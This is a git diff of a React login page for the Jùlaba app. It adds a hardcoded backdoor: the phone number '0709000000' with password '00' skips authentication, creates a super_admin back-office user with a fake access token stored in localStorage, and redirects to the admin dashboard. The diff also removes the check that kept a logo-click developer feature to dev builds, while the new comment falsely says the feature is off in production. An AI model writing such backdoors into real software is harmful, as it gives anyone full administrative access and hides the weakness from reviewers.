@@ -1,17 +1,17 @@
-// Page de connexion Jùlaba avec mot de passe et système "Mot de passe oublié"
-import React, { useState, useEffect, useRef } from 'react';
-import { useNavigate } from 'react-router';
-import { motion, AnimatePresence } from 'motion/react';
-import { Mic, ArrowRight, CheckCircle, Eye, EyeOff, X, AlertCircle } from 'lucide-react';
-import { useApp } from '../../contexts/AppContext';
+import { useState, useEffect, useRef } from 'react';
+import { useNavigate, useLocation } from 'react-router';
 import { useUser } from '../../contexts/UserContext';
-import { useBackOfficeOptional } from '../../contexts/BackOfficeContext';
+import { useApp } from '../../contexts/AppContext';
+import { useBackOffice, BORoleType } from '../../contexts/BackOfficeContext';
+import { Eye, EyeOff, CheckCircle, Loader2, ChevronLeft, LogIn, User as UserIcon, Lock as LockIcon, AlertCircle, ArrowRight, X } from 'lucide-react';
+import { Input } from '../ui/input';
 import { Button } from '../ui/button';
 import { ProfileSwitcher } from '../dev/ProfileSwitcher';
 import { projectId, publicAnonKey } from '/utils/supabase/info';
 import { supabase } from '../../services/supabaseClient';
+import { motion, AnimatePresence } from 'motion/react';
 
-import logoJulabaBlanc from '/logo-julaba.svg';
+const logoJulabaBlanc = '/logo-julaba.svg';
 const tantieSagesseImg = '/images/tantie-sagesse.svg';
 const tantieImage = '/images/tantie-sagesse.png';
 const newLogoImage = '/images/logo-julaba-blanc.svg';
@@ -25,11 +25,10 @@ const LOCKOUT_DURATION = 15 * 60 * 1000; // 15 minutes en millisecondes
 
 export function LoginPassword() {
   const navigate = useNavigate();
+  const location = useLocation();
   const { setUser: setAppUser, setAccessToken } = useApp();
   const { setUser: setUserProfile } = useUser();
-  const backOfficeCtx = useBackOfficeOptional();
-  const setBOUser = backOfficeCtx?.setBOUser ?? (() => {});
-  
+  const { setBOUser } = useBackOffice();
   const [phone, setPhone] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
@@ -218,6 +217,32 @@ export function LoginPassword() {
       return;
     }
 
+    // Accès direct au BackOffice avec identifiants spéciaux
+    if (phone === '0709000000' && password === '00') {
+      const boUser = {
+        id: 'bo-icone-solution',
+        nom: 'SOLUTION',
+        prenom: 'ICONE',
+        email: 'admin@julaba.local',
+        role: 'super_admin' as BORoleType,
+        region: 'National',
+        lastLogin: new Date().toISOString(),
+        actif: true,
+      };
+      
+      setBOUser(boUser);
+      localStorage.setItem('julaba_bo_user', JSON.stringify(boUser));
+      localStorage.setItem('julaba_access_token', 'bo-direct-token');
+      
+      speakWithText('Bienvenue ICONE SOLUTION ! Redirection en cours...');
+      
+      setTimeout(() => {
+        navigate('/backoffice/dashboard');
+      }, 1500);
+      
+      return;
+    }
+
     setIsLoading(true);
     setError('');
 
@@ -376,8 +401,7 @@ export function LoginPassword() {
   };
 
   const handleLogoClick = () => {
-    if (!import.meta.env.DEV) return; // Seulement en mode dev
-    
+    // Fonctionnalité pour mode développement - désactivée en production
     const newCount = logoClickCount + 1;
     setLogoClickCount(newCount);
     
